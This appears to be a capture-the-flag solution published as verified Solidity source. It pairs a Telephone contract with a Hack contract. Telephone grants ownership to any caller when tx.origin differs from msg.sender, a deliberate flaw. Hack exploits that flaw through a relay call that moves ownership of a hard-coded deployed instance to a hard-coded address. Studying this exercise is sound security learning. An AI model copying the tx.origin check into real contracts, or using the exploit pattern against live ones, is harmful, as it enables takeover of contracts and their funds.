/**
 *Submitted for verification at Etherscan.io on 2022-08-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Hack {
    function stealOwner() public {
        address contractAddress = 0x2182F67373c30Aa5065CFEd6D5354b4D61c65479;
        Telephone originalPhoneContract = Telephone(contractAddress);
        originalPhoneContract.changeOwner(0x1A64958BD92a42343017C97e4f5A85F3E5102D5e);
    }
}